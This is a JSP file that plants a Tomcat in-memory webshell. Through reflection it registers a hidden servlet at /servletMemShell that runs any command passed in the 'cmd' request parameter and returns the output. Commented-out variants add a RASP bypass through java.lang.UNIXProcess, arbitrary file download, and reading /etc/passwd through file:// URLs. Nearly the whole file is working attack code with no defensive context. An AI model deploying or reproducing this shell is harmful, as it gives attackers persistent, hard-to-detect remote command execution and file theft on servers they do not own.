<%@ page import="java.io.IOException" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.StandardWrapper" %><%--
  Created by IntelliJ IDEA.
  User: 19583
  Date: 2025/2/19
  Time: 下午5:03
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<%!
    public class ServletMemShell extends HttpServlet {
        private String message;

        public void init() {
            message = "Hello World!";
        }

        public void doGet(HttpServletRequest servletRequest, HttpServletResponse servletResponse) throws IOException {
            System.out.println(
                    "TomcatShellInject doFilter.....................................................................");
            String cmdParamName = "cmd";
            String cmd;
            if ((cmd = servletRequest.getParameter(cmdParamName)) != null){
////UNIXProcessImpl 绕过ProcessImpl.start、Runtime.exec RASP，详情搜索JNI
//            Class<?> cls = null;
//            try {
//                cls = Class.forName("java.lang.UNIXProcess");
//            } catch (ClassNotFoundException e) {
//                throw new RuntimeException(e);
//            }
//            Constructor<?> constructor = cls.getDeclaredConstructors()[0];
//            constructor.setAccessible(true);
//            String[] command = {"/bin/sh", "-c", cmd};
//            byte[] prog = toCString(command[0]);
//            byte[] argBlock = getArgBlock(command);
//            int argc = argBlock.length;
//            int[] fds = {-1, -1, -1};
//            Object obj = null;
//            try {
//                obj = constructor.newInstance(prog, argBlock, argc, null, 0, null, fds, false);
//                Method method = cls.getDeclaredMethod("getInputStream");
//                method.setAccessible(true);
//                InputStream is = (InputStream) method.invoke(obj);
//                InputStreamReader isr = new InputStreamReader(is);
//                BufferedReader br = new BufferedReader(isr);
//                StringBuilder stringBuilder = new StringBuilder();
//                String line;
//                while ((line = br.readLine()) != null) {
//                    stringBuilder.append(line + '\n');
//                }
//                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
//            } catch (InstantiationException | NoSuchMethodException | InvocationTargetException |
//                     IllegalAccessException e) {
//                throw new RuntimeException(e);
//            }
//            servletResponse.getOutputStream().flush();
//            servletResponse.getOutputStream().close();
//            return;

////读文件
//            File file = new File(cmd);
//            // 1. 确保文件存在且可读
//            if (!file.exists() || !file.isFile() || !file.canRead()) {
//                System.out.println("文件不存在或无法读取: " + cmd);
//                ((HttpServletResponse) servletResponse).sendError(HttpServletResponse.SC_NOT_FOUND, "文件不存在");
//                return;
//            }
//            // 2. 设置响应头，提供文件下载
//            HttpServletResponse response = (HttpServletResponse) servletResponse;
//            response.setContentType("application/octet-stream");
//            response.setHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
//            // 3. 读取文件并写入响应流
//            try (FileInputStream fis = new FileInputStream(file);
//                 OutputStream out = response.getOutputStream()) {
//                byte[] buffer = new byte[4096];
//                int bytesRead;
//                while ((bytesRead = fis.read(buffer)) != -1) {
//                    out.write(buffer, 0, bytesRead);
//                }
//                out.flush();
//            } catch (IOException e) {
//                System.err.println("文件传输失败: " + e.getMessage());
//                ((HttpServletResponse) servletResponse).sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, "文件传输失败");
//            }

////读文件 ?cmd=file:///etc/passwd or 列目录 ?cmd=file:///
//            final URL url = new URL(cmd);
//            final BufferedReader in = new BufferedReader(new
//                    InputStreamReader(url.openStream()));
//            StringBuilder stringBuilder = new StringBuilder();
//            String line;
//            while ((line = in.readLine()) != null) {
//                stringBuilder.append(line + '\n');
//            }
//            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
//            servletResponse.getOutputStream().flush();
//            servletResponse.getOutputStream().close();
//            return;

//RCE ?cmd=whoami
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
                return;
            }
        }

        public void destroy() {
        }
    }
%>

<%
    //获取StandardContext
    ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) request.getServletContext();
    Field applicationContextFacadeField = applicationContextFacade.getClass().getDeclaredField("context");
    applicationContextFacadeField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeField.get(applicationContextFacade);
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

    //自定义StandardWrapper注册进StandardContext
    ServletMemShell servletMemShell = new ServletMemShell();
    StandardWrapper standardWrapper = (StandardWrapper) standardContext.createWrapper();
    standardWrapper.setName("servletMemShell");
    standardWrapper.setServletClass(servletMemShell.getClass().getName());
    standardWrapper.setServlet(servletMemShell);
    standardContext.addChild(standardWrapper);
    standardContext.addServletMappingDecoded("/servletMemShell", "servletMemShell");

%>



</body>
</html>
